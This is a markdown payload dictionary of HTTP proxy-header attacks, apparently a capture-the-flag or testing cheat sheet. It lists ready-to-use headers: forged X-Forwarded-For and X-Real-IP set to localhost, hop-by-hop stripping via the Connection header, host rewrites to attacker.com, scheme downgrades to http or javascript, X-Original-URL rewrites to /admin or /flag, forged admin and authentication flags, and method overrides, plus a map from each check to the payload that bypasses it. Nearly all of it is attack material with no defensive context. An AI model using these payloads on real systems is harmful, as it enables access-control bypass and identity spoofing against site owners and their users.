# Payload dictionary — every proxy-header payload, in one corpus

The complete set of payloads — the client-supplied and the stripped.

---

## 1. The hop-by-hop payloads — the Connection-strip

```text
Connection: keep-alive, X-Real-IP         → the proxy strips X-Real-IP
Connection: keep-alive, X-Forwarded-For   → the proxy strips X-Forwarded-For
Connection: keep-alive, X-Forwarded-Host  → the proxy strips X-Forwarded-Host
Connection: keep-alive, X-Internal        → the proxy strips X-Internal
Connection: keep-alive, X-Admin           → the proxy strips X-Admin
Connection: keep-alive, X-Original-URL    → the proxy strips X-Original-URL
Connection: keep-alive, X-Rewrite-URL     → the proxy strips X-Rewrite-URL
Connection: keep-alive, X-Forwarded-Scheme→ the proxy strips X-Forwarded-Scheme
Connection: keep-alive, X-Forwarded-Proto → the proxy strips X-Forwarded-Proto
Connection: keep-alive, X-Client-IP       → the proxy strips X-Client-IP
Connection: keep-alive, X-Host            → the proxy strips X-Host
```

## 2. The spoofed-IP payloads — a forged client IP

```text
X-Real-IP: 127.0.0.1                      → a local request
X-Forwarded-For: 127.0.0.1                → a local request
X-Client-IP: 127.0.0.1                    → a local request
X-Remote-IP: 127.0.0.1                    → a local request
X-Real-IP: ::1                            → a local request (IPv6)
X-Forwarded-For: ::1                      → a local request (IPv6)
X-Forwarded-For: 127.0.0.1, <real-ip>     → a chained IP spoof
Forwarded: for=127.0.0.1                  → an RFC 7239 spoof
Forwarded: for=127.0.0.1;host=target.com  → a chained RFC 7239 spoof
```

## 3. The spoofed-host payloads — a rewritten host

```text
X-Forwarded-Host: attacker.com            → the app's links point to attacker.com
X-Host: attacker.com                      → a rewritten host
X-Forwarded-Host: //attacker.com          → a protocol-relative rewrite
X-Forwarded-Host: attacker.com/path       → a path-rewrite
Forwarded: host=attacker.com              → an RFC 7239 host rewrite
```

## 4. The spoofed-scheme payloads — a scheme downgrade

```text
X-Forwarded-Scheme: http                  → the app's links use http
X-Forwarded-Proto: http                   → a proto-downgrade
X-Forwarded-Scheme: javascript            → a JS-scheme
X-Forwarded-Proto: javascript             → a proto-JS
Forwarded: proto=http                     → an RFC 7239 scheme downgrade
```

## 5. The spoofed-path payloads — a rewritten path

```text
X-Original-URL: /admin                    → the app serves /admin under /page
X-Rewrite-URL: /admin                     → a rewrite to /admin
X-Original-URL: /flag                     → a rewrite to /flag
X-Original-URL: /internal/secret          → a rewrite to an internal route
X-Original-Request-URI: /admin            → a rewritten request-URI
X-Original-Path: /admin                   → a rewritten path
```

## 6. The spoofed-flag payloads — a forged flag

```text
X-Internal: true                          → an internal-route check bypass
X-Admin: true                             → an admin check bypass
X-Debug: true                             → a debug check bypass
X-Preview: true                           → a preview check bypass
X-Authenticated: true                     → an auth check bypass
X-Forwarded-Email: admin@target.com       → a forged user
X-Forwarded-User: admin                   → a forged user
```

## 7. The method-override payloads — a forged method

```text
X-HTTP-Method-Override: DELETE            → a DELETE-as-POST
X-HTTP-Method-Override: PUT               → a PUT-as-POST
X-HTTP-Method-Override: PATCH             → a PATCH-as-POST
X-Original-Method: DELETE                 → a method-override
X-Method-Override: DELETE                 → a method-override
```

## 8. The multi-proxy payloads — a chained normalization

```text
a header the edge strips but the origin doesn't — a chained differential
a header the edge forwards but the origin adds — a chained rewrite
```

## 9. The header-name payloads — a case/whitespace difference

```text
X-Real-Ip: 127.0.0.1                      → a case difference
X-Real-IP : 127.0.0.1                     → a whitespace difference
X-Real_IP: 127.0.0.1                      → an underscore difference
X-Real-IP\t: 127.0.0.1                    → a tab difference
```

## 10. The payload-to-surface map — which payload for which surface

```text
a local-vs-remote check     → X-Real-IP: 127.0.0.1 / X-Forwarded-For: 127.0.0.1
an internal-route check     → X-Internal: true
an admin check              → X-Admin: true
a host check                → X-Forwarded-Host: attacker.com
a scheme check              → X-Forwarded-Scheme: http
a path check                → X-Original-URL: /admin
a method check              → X-HTTP-Method-Override: DELETE
a hop-by-hop strip          → Connection: keep-alive, <header>
```

## 11. The payload's reach — the gated route

```text
the payload reaches a route the proxy's header gates — an
authenticated-only route, an internal route, a restricted endpoint —
the app's trust check reads the missing or client-supplied header's
effect.
```

## 12. The payload's falsifier — a non-header check

```text
the card's falsifier: 'both forms are rejected, so the trust check
does not depend on that header' — the header isn't the trust check's
input → a different class.
```
